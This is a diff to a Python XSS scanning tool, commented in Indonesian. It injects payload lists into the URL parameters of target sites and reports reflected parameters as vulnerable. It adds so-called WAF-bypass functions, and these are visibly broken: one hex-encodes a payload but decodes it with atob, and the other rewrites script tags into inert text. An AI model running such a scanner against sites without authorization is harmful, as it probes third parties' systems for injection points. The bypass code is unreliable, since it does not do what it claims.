@@ -2,16 +2,15 @@ import argparse
 import requests
 from urllib.parse import urlparse, urlencode, parse_qs
 from colorama import Fore, init
+from datetime import datetime  # Tambahkan import ini
 import random
 import string
 
 # Inisialisasi colorama untuk mendukung pewarnaan teks di terminal
 init(autoreset=True)
 
+
 def send_request(url, headers=None):
-    """
-    Mengirimkan HTTP request ke URL dan mengembalikan respons.
-    """
     try:
         response = requests.get(url, headers=headers, timeout=10)
         return response
@@ -19,27 +18,20 @@ def send_request(url, headers=None):
         print(f"[ERROR] Request failed: {e}")
         return None
 
+
 def generate_obfuscated_payload(payload):
-    """
-    Obfuscate the XSS payload to bypass WAFs.
-    """
-    # Contoh obfuscation: mengganti <script> menjadi kode JavaScript yang berbeda
-    obfuscated_payload = payload.replace("<script>", "/*<*/script/*>*/").replace("</script>", "/*<*/script/*>*/")
+    obfuscated_payload = payload.replace(
+        "<script>", "/*<*/script/*>*/").replace("</script>", "/*<*/script/*>*/")
     return obfuscated_payload
 
+
 def generate_random_payload():
-    """
-    Generate a random payload using base64 encoding or hex encoding.
-    """
-    # Generate a random payload by encoding a simple XSS attack
     basic_payload = "<script>alert('XSS');</script>"
     payload_base64 = basic_payload.encode('utf-8').hex()
     return f"eval(atob('{payload_base64}'))"
 
+
 def test_xss(url, xss_payloads, output_file=None):
-    """
-    Menguji kerentanan XSS pada URL menggunakan daftar payload.
-    """
     print(f"[INFO] Testing XSS on {url}\n")
     results = []
     parsed_url = urlparse(url)
@@ -53,41 +45,39 @@ def test_xss(url, xss_payloads, output_file=None):
     # Cek setiap parameter URL untuk kerentanannya
     for param_name in params:
         for payload in xss_payloads:
-            # Ganti nilai parameter dengan payload
+            timestamp = datetime.now().strftime('%H:%M:%S')   # Waktu sekarang
             modified_params = {**params, param_name: [payload]}
             query_string = urlencode(modified_params, doseq=True)
             test_url = f"{base_url}?{query_string}"
-            print(f"[TESTING] XSS URL: {test_url}")
+            print(
+                f"{Fore.BLUE}[{timestamp}] {Fore.WHITE}[TESTING] XSS URL: {test_url}")
 
-            # Kirim permintaan
             response = send_request(test_url)
 
-            # Periksa apakah payload ada dalam respons
             if response and payload in response.text:
-                result = f"{Fore.RED}[VULNERABLE - XSS] Parameter '{param_name}' executed payload: {payload}{Fore.RESET}"
+                result = f"{Fore.BLUE}[{timestamp}] {Fore.RED}[VULNERABLE - XSS] Parameter '{param_name}' executed payload: {payload}{Fore.RESET}"
                 print(result)
                 results.append(result)
             else:
                 print(
-                    f"[SAFE - XSS] Parameter '{param_name}' did not execute payload: {payload}"
+                    f"{Fore.BLUE}[{timestamp}] {Fore.WHITE}[SAFE - XSS] Parameter '{param_name}' did not execute payload: {payload}"
                 )
 
-    # Simpan hasil ke file jika diperlukan
     if output_file:
         with open(output_file, 'a') as file:
             file.write("\n".join(results) + "\n")
-        print(f"\n[INFO] Results saved to: {output_file}")
+        print(
+            f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [INFO] Results saved to: {output_file}")
+
 
 def load_payloads(file_path):
-    """
-    Memuat payload XSS dari file.
-    """
     try:
         with open(file_path, 'r') as file:
             return [line.strip() for line in file if line.strip()]
     except FileNotFoundError:
         print("[ERROR] Payload file not found! Exiting.")
         return []
+
 
 def main():
     print(r"""
@@ -98,7 +88,7 @@ def main():
 
    XSS Vulnerability Testing Tool
     """)
-    
+
     parser = argparse.ArgumentParser(description="XSS Vulnerability Tester")
     parser.add_argument(
         "-u", "--url", help="Single URL to test (e.g., https://example.com/search?q=test)"
@@ -115,18 +105,15 @@ def main():
 
     args = parser.parse_args()
 
-    # Validasi input URL atau file
     if not args.url and not args.file:
         print("[ERROR] Either --url or --file must be provided. Exiting.")
         return
 
-    # Memuat payload
     payloads = load_payloads(args.payloads)
     if not payloads:
         print("[ERROR] No payloads loaded. Exiting.")
         return
 
-    # Daftar URL
     if args.url:
         urls = [args.url]
     elif args.file:
@@ -137,11 +124,11 @@ def main():
             print("[ERROR] URL file not found! Exiting.")
             return
 
-    # Uji setiap URL
     for url in urls:
-        # Implement bypass techniques
-        bypassed_payloads = [generate_obfuscated_payload(p) for p in payloads] + [generate_random_payload()]
+        bypassed_payloads = [generate_obfuscated_payload(
+            p) for p in payloads] + [generate_random_payload()]
         test_xss(url, bypassed_payloads, output_file=args.output)
+
 
 if __name__ == "__main__":
     main()
